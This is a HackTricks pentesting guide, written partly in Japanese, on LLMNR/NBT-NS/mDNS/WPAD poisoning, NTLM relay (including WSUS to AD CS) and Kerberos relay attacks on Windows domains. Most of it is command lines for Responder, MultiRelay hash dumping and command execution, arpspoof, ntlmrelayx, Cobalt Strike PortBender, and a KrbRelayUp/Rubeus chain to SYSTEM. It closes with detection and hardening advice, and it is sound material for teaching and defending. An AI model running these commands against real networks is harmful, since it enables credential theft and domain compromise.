# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Network Protocols

### Local Host Resolution Protocols

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft やその他の OS は、DNS が失敗した場合のローカル名解決に LLMNR と NBT-NS を使用します。同様に、Apple や Linux 系は mDNS を使用します。
- これらのプロトコルは、UDP 上の未認証かつブロードキャスト的な性質のため、傍受や偽装 (spoofing) に対して脆弱です。
- [Responder](https://github.com/lgandx/Responder) や [Dementor](https://github.com/MatrixEditor/Dementor) を使用して、これらのプロトコルをクエリするホストに対して偽の応答を送り、サービスをなりすますことができます。
- Responder を使ったサービスなりすましの詳細は [here](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) を参照してください。

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD はブラウザがプロキシ設定を自動検出することを可能にします。
- 検出は DHCP、DNS を介して行われ、DNS が失敗した場合は LLMNR や NBT-NS へフォールバックします。
- Responder は WPAD 攻撃を自動化でき、クライアントを悪意ある WPAD サーバに誘導します。

### Responder/Dementor for Protocol Poisoning

- **Responder** は LLMNR、NBT-NS、mDNS クエリを毒化 (poison) するためのツールで、クエリ種別に応じて選択的に応答し、主に SMB サービスを標的とします。
- Kali Linux にプリインストールされており、`/etc/responder/Responder.conf` で設定できます。
- Responder は画面上にキャプチャしたハッシュを表示し、`/usr/share/responder/logs` ディレクトリに保存します。
- IPv4 と IPv6 の両方をサポートします。
- Windows 版 Responder は [here](https://github.com/lgandx/Responder-Windows) で入手できます。

- **Dementor** は multicast poisoning のトピックを拡張し、さらに不正なサービスプロバイダとして振る舞う（CUPS RCE サポートを含む）機能を備えています。
- 全体構成は **Responder** に類似していますが、より細かな設定が可能です。（デフォルトはここ: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml)）
- **Dementor** と **Responder** の互換性はここに示されています: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- 紹介とドキュメント: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- 特定のプロトコルで Responder によって発生するキャプチャの問題を修正します

#### Running Responder

- デフォルト設定で Responder を実行するには: `responder -I <Interface>`
- より積極的なプロービング（副作用の可能性あり）: `responder -I <Interface> -P -r -v`
- NTLMv1 challenge/response をキャプチャしてクラッキングを容易にするテクニック: `responder -I <Interface> --lm --disable-ess`
- WPAD なりすましを有効にするには: `responder -I <Interface> --wpad`
- NetBIOS リクエストを攻撃者の IP に解決し、認証プロキシを設定する: `responder.py -I <interface> -Pv`

#### Running Dementor

- デフォルト設定で実行: `Dementor -I <interface>`
- 分析モードでデフォルト設定: `Dementor -I <interface> -A`
- 自動 NTLM セッションダウングレード (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- カスタム設定で現在のセッションを実行: `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning with Responder

- DHCP レスポンスを偽装することで、ターゲットのルーティング情報を恒久的に汚染でき、ARP poisoning よりも検知されにくい手段を提供します。
- これにはターゲットネットワークの構成に関する正確な知識が必要です。
- 攻撃の実行: `./Responder.py -I eth0 -Pdv`
- この手法は NTLMv1/2 ハッシュを効果的にキャプチャできますが、ネットワーク障害を避けるために慎重な取り扱いが必要です。

### Capturing Credentials with Responder/Dementor

- Responder/Dementor は上記のプロトコルを使ってサービスをなりすまし、ユーザが偽装サービスに対して認証を試みると資格情報（通常は NTLMv2 Challenge/Response）をキャプチャします。
- NetNTLMv1 にダウングレードしたり、ESS を無効にしてクラッキングを容易にする試みが行われることがあります。

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

It's crucial to note that employing these techniques should be done legally and ethically, ensuring proper authorization and avoiding disruption or unauthorized access.

## Inveigh

Inveigh は Windows システム向けに設計された penetration testers と red teamers 向けのツールで、Responder と同様の機能を提供し、spoofing や man-in-the-middle 攻撃を行います。ツールは PowerShell スクリプトから C# バイナリへ進化しており、主要なバージョンとして [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) と [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) があります。詳細なパラメータと手順は [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) を参照してください。

Inveigh は PowerShell を通じて操作できます:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
または C# バイナリとして実行:
```bash
Inveigh.exe
```
### NTLM Relay Attack

この攻撃はSMB認証セッションを利用して対象マシンにアクセスし、成功すればシステムシェルを取得します。主な前提条件は次の通りです:

- 認証ユーザーが中継先ホストで Local Admin アクセスを持っていること。
- SMB signing が無効になっていること。

#### 445 ポートフォワーディングとトンネリング

直接的なネットワーク導入が困難な場合、port 445 のトラフィックをフォワードおよびトンネルする必要があります。[**PortBender**](https://github.com/praetorian-inc/PortBender) のようなツールは、port 445 トラフィックを別のポートへリダイレクトするのに役立ち、ドライバをロードするためのローカル管理者アクセスがある場合に必須です。

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### NTLM Relay Attack のその他のツール

- **Metasploit**: プロキシやローカル／リモートホストの情報を設定して使用する。
- **smbrelayx**: SMBセッションを中継し、コマンド実行やbackdoorsの展開を行うPythonスクリプト。
- **MultiRelay**: Responderスイートのツールで、特定ユーザや全ユーザを中継し、コマンド実行やハッシュのダンプを行う。

各ツールは必要に応じてSOCKSプロキシ経由で動作するよう設定でき、間接的なネットワークアクセスしかない場合でも攻撃を可能にする。

### MultiRelay の動作

MultiRelayは _**/usr/share/responder/tools**_ ディレクトリから実行され、特定のIPやユーザーをターゲットにします。
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
These tools and techniques form a comprehensive set for conducting NTLM Relay attacks in various network environments.

### WSUS HTTP (8530) を悪用して NTLM Relay を LDAP/SMB/AD CS (ESC8) に対して行う

WSUS クライアントは、HTTP (8530) または HTTPS (8531) 上の NTLM を使って更新サーバに認証します。HTTP が有効な場合、ローカルセグメント上で定期的なクライアントのチェックインを強制したり傍受して ntlmrelayx で LDAP/LDAPS/SMB や AD CS HTTP エンドポイント (ESC8) にリレーすることができ、ハッシュを解読する必要はありません。これは通常の更新トラフィックに紛れ、しばしばマシンアカウント認証（HOST$）を得られます。

What to look for
- GPO/registry configuration under HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate and ...\WindowsUpdate\AU:
- WUServer (e.g., http://wsus.domain.local:8530)
- WUStatusServer (reporting URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled and DetectionFrequency (hours)
- WSUS SOAP endpoints used by clients over HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Default ports: 8530/tcp HTTP, 8531/tcp HTTPS

Reconnaissance
- Unauthenticated
- Scan for listeners: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Sniff HTTP WSUS traffic via L2 MITM and log active clients/endpoints with wsusniff.py (HTTP only unless you can make clients trust your TLS cert).
- Authenticated
- Parse SYSVOL GPOs for WSUS keys with MANSPIDER + regpol (wsuspider.sh wrapper summarises WUServer/WUStatusServer/UseWUServer).
- Query endpoints at scale from hosts (NetExec) or locally:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

End-to-end HTTP relay steps
1) Position for MITM (same L2) so a client resolves the WSUS server to you (ARP/DNS poisoning, Bettercap, mitm6, etc.). Example with arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Redirect port 8530 to your relay listener (optional, convenient):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Start ntlmrelayx with the HTTP listener (requires Impacket support for HTTP listener; see PRs below):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Other common targets:
- Relay to SMB (if signing off) for exec/dump: -t smb://<host>
- Relay to LDAPS for directory changes (e.g., RBCD): -t ldaps://<DC>
- Relay to AD CS web enrollment (ESC8) to mint a cert and then authenticate via Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
For deeper AD CS abuse paths and tooling, see the AD CS page:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Trigger a client check-in or wait for schedule. From a client:
wuauclt.exe /detectnow
or use the Windows Update UI (Check for updates).

5) Use the authenticated SOCKS sessions (if -socks) or direct relay results for post-exploitation (LDAP changes, SMB ops, or AD CS certificate issuance for later authentication).

HTTPS constraint (8531)
- Passive interception of WSUS over HTTPS is ineffective unless clients trust your certificate. Without a trusted cert or other TLS break, the NTLM handshake can’t be harvested/relayed from WSUS HTTPS traffic.

Notes
- WSUS was announced deprecated but remains widely deployed; HTTP (8530) is still common in many environments.
- Useful helpers: wsusniff.py (observe HTTP WSUS check-ins), wsuspider.sh (enumerate WUServer/WUStatusServer from GPOs), NetExec reg-query at scale.
- Impacket restored HTTP listener support for ntlmrelayx in PR #2034 (originally added in PR #913).

### Force NTLM Logins

In Windows you **may be able to force some privileged accounts to authenticate to arbitrary machines**. Read the following page to learn how:


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

A **Kerberos relay attack** steals an **AP-REQ ticket** from one service and re-uses it against a second service that shares the **same computer-account key** (because both SPNs sit on the same `$` machine account). This works even though the SPNs’ **service classes differ** (e.g. `CIFS/` → `LDAP/`) because the *key* that decrypts the ticket is the machine’s NT hash, not the SPN string itself and the SPN string is not part of the signature.

Unlike NTLM relay, the hop is limited to the *same host* but, if you target a protocol that lets you write to LDAP, you can chain into **Resource-Based Constrained Delegation (RBCD)** or **AD CS enrollment** and pop **NT AUTHORITY\SYSTEM** in a single shot.

For detailed info about this attack check:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos basics**

| Token | Purpose | Relay relevance |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | ユーザを KDC に証明する | unchanged |
| **Service ticket / TGS-REQ ↔ REP** | 1 つの **SPN** に結び付けられ、SPN の所有者のキーで暗号化される | SPNs が同じアカウントを共有していれば相互利用可能 |
| **AP-REQ** | クライアントが `TGS` をサービスに送る | **我々が盗んで再生するもの** |

* Tickets are encrypted with the **password-derived key of the account that owns the SPN**.
* The **Authenticator** inside the AP-REQ has a 5-minute timestamp; replay inside that window is valid until the service cache sees a duplicate.
* Windows rarely checks if the SPN string in the ticket matches the service you hit, so a ticket for `CIFS/HOST` normally decrypts fine on `LDAP/HOST`.

- 2. **What must be true to relay Kerberos**

1. **Shared key:** source and target SPNs belong to the same computer account (default on Windows servers).
2. **No channel protection:** SMB/LDAP signing off and EPA off for HTTP/LDAPS.
3. **You can intercept or coerce authentication:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, etc..
4. **Ticket source not already used:** you win the race before the real packet hits or block it entirely; otherwise the server’s replay cache fires Event 4649.
5. You need to somehow be able to perform a **MitM in the communication** maybe being part of the DNSAmins group to modify the DNS of the domain or being able to change the HOST file of the victim.

### Kerberos Relay Steps

- 3.1 **Recon the host**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **relay listener を開始する**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` は **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** を 1つの binary にまとめます。

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce は DC に Kerberos `CIFS/DC01` チケットを送らせる。

- 3.4 **Relay the AP-REQ**

KrbRelay は SMB から GSS blob を抽出し、それを LDAP bind に再梱包して `ldap://DC01` に転送する—認証は **同じ鍵** で復号されるため成功する。

- 3.5 **Abuse LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
あなたは現在 **NT AUTHORITY\SYSTEM** を所有している。


### **知っておくべき追加の経路**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | 偽サーバーが任意のSPNで**GSS-ID payload**を送信すると、クライアントはあなた宛に直接AP-REQを作成する | サブネットを跨いでも動作する；デフォルトでmachine creds |
| **DCOM / MSRPC** | 悪意のあるOXID resolverがクライアントを任意のSPNとポートにauthさせる | 純粋な*local*なpriv-esc；firewallを回避 |
| **AD CS Web Enroll** | マシンチケットを`HTTP/CA`にリレーして証明書を取得し、次に**PKINIT**でTGTsを生成する | LDAP署名による防御を回避する |
| **Shadow Credentials** | `msDS-KeyCredentialLink`を書き込み、偽造鍵ペアでPKINITを行う | コンピュータアカウントを追加する必要がない |

### **トラブルシューティング**

| Error | Meaning | Fix |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | チケットキー ≠ 対象キー | 対象ホスト/SPNが間違っている |
| `KRB_AP_ERR_SKEW` | クロックのずれが5分以上 | 時刻を同期するか `w32tm` を使用する |
| LDAP bind fails | 署名が強制されている | AD CS 経路を使うか署名を無効化する |
| Event 4649 spam | サービスが重複したAuthenticatorを検出した | オリジナルパケットをブロックするかレースさせる |


### **検出**

* 同一ソースから数秒以内に`CIFS/`, `HTTP/`, `LDAP/`で**Event 4769**が急増する。
* サービス上の**Event 4649**はリプレイ検出を示す。
* **127.0.0.1**からのKerberosログオン（ローカルSCMへのリレー）は非常に疑わしい — KrbRelayUpドキュメントのSigmaルールでマッピングする。
* `msDS-AllowedToActOnBehalfOfOtherIdentity`または`msDS-KeyCredentialLink`属性の変更を監視する。

## **ハードニング**

1. **Enforce LDAP & SMB signing + EPA** をすべてのサーバーで有効にする。
2. **Split SPNs** してHTTPがCIFS/LDAPと同じアカウントにならないようにする。
3. PetitPotam KB5005413、DFS、AuthIPなどの強制ベクターをパッチ適用する。
4. 不正なコンピュータ参加を防ぐために **`ms-DS-MachineAccountQuota = 0`** を設定する。
5. **Event 4649** および予期しないループバックKerberosログオンに対してアラートを設定する。



## References

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
